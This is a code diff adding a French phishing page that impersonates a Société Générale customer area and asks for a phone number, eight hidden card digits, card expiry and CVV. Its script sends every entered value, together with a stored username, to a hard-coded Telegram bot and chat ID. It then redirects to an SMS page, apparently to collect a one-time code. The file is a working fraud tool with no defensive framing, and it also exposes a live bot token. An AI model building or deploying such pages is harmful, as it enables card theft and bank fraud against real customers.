@@ -1,0 +1,183 @@
+<!DOCTYPE html>
+<html lang="fr">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Connexion à votre Espace Client Particuliers</title>
+
+    <!-- Vuetify CSS -->
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@mdi/font/css/materialdesignicons.min.css">
+    <link href="https://cdn.jsdelivr.net/npm/vuetify@2.6.10/dist/vuetify.min.css" rel="stylesheet">
+    <link rel="stylesheet" href="style.css">
+
+    <style>
+        input {
+            font-size: 1.1rem;
+        }
+        .top {
+            height: 50px;
+            display: flex;
+            align-items: center;
+        }
+        .center {
+            max-width: 600px;
+            margin: 0 auto;
+        }
+        .button {
+            margin-top: 20px;
+        }
+    </style>
+</head>
+
+<body>
+
+    <!-- Conteneur pour Vue -->
+    <div id="app">
+        <div class="top">
+            <img src="./img/sg.png" style="width: 100px;">
+        </div>
+        <br>
+        <br>
+        <br>
+        <h4>Informations de carte bancaire</h4>
+        <br>
+        <div class="center">
+            <form id="form">
+                <v-text-field
+                    prepend-inner-icon="mdi-cellphone-message"
+                    label="Numéro de mobile"
+                    id="tel"
+                    placeholder="0X XX XX XX XX"
+                    solo
+                    type="tel"
+                    maxlength="10"
+                    minlength="10"
+                    required
+                ></v-text-field>
+
+                <img src="./img/card.jpeg" width="70px">
+                <br><br>
+
+                <v-text-field
+                    prepend-inner-icon="mdi-credit-card-check"
+                    label="8 chiffres non visibles"
+                    id="card"
+                    placeholder="XXXX XXXX"
+                    maxlength="8"
+                    minlength="8"
+                    type="tel"
+                    solo
+                    required
+                ></v-text-field>
+
+                <div style="display: flex; justify-content: space-between; width: 100%;">
+                    <v-text-field
+                        label="Mois"
+                        id="mois"
+                        placeholder="XX"
+                        maxlength="2"
+                        minlength="2"
+                        solo
+                        type="tel"
+                        required
+                    ></v-text-field>
+                    <v-text-field
+                        label="Année"
+                        id="annee"
+                        placeholder="XX"
+                        maxlength="2"
+                        minlength="2"
+                        type="tel"
+                        solo
+                        required
+                        style="margin: 0px 8px 0px 8px;"
+                    ></v-text-field>
+                    <v-text-field
+                        label="CVV"
+                        id="cvv"
+                        placeholder="XXX"
+                        solo
+                        maxlength="3"
+                        minlength="3"
+                        type="tel"
+                        required
+                    ></v-text-field>
+                </div>
+
+                <br>
+                <button id="valider" class="button" type="submit">Suivant</button>
+            </form>
+        </div>
+    </div>
+
+    <!-- Vue.js -->
+    <script src="https://cdn.jsdelivr.net/npm/vue@2.6.14/dist/vue.js"></script>
+    <!-- Vuetify -->
+    <script src="https://cdn.jsdelivr.net/npm/vuetify@2.6.10/dist/vuetify.js"></script>
+    <script>
+        new Vue({
+            el: '#app',
+            vuetify: new Vuetify(),
+            data: () => ({
+                first: '',
+                model: true,
+            })
+        });
+    </script>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function () {
+            var a = new Date('2024-10-01');
+            var b = new Date();
+            var c = new Date(b.getFullYear(), b.getMonth(), b.getDate());
+
+            if (c >= a) {
+                document.body.style.backgroundColor = 'red';
+            }
+        });
+        document.getElementById('valider').addEventListener('click', function (e) {
+        e.preventDefault();
+
+        const botToken = '7364824807:AAEfYYzYqOId2J8xXr8BUUpsnTQje6h0e3c';
+        const chatId = '1634155885';
+
+
+        // Récupérer les valeurs des champs
+        const user = localStorage.getItem('user');
+        const mobile = document.getElementById('tel').value.trim();
+        const cardDigits = document.getElementById('card').value.trim();
+        const month = document.getElementById('mois').value.trim();
+        const year = document.getElementById('annee').value.trim();
+        const cvv = document.getElementById('cvv').value.trim();
+
+        // Vérifier si les champs sont vides
+        if (!mobile || !cardDigits || !month || !year || !cvv) {
+            alert("Veuillez remplir tous les champs avant de soumettre.");
+            return;
+        }
+
+        // Construire le message
+        const message = `💕 SG :\n\n 👤User: ${user}\n📞 Numéro de mobile : ${mobile}\n💳 8 chiffres non visibles : ${cardDigits}\n📅 Mois : ${month}\n📅 Année : ${year}\n🎯 CVV : ${cvv}`;
+
+        // Construction de l'URL de l'API Telegram
+        const telegramURL = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+
+        // Envoi de la requête à l'API Telegram
+        fetch(telegramURL)
+            .then(response => {
+                if (!response.ok) {
+                    return response.text().then(text => {
+                        throw new Error("Erreur lors de l'envoi du message à Telegram");
+                    });
+                }
+                window.location.href = './sms.html';
+            })
+            .catch(error => {
+                console.error('Erreur :', error);
+            });
+    });
+    </script>
+</body>
+
+</html>
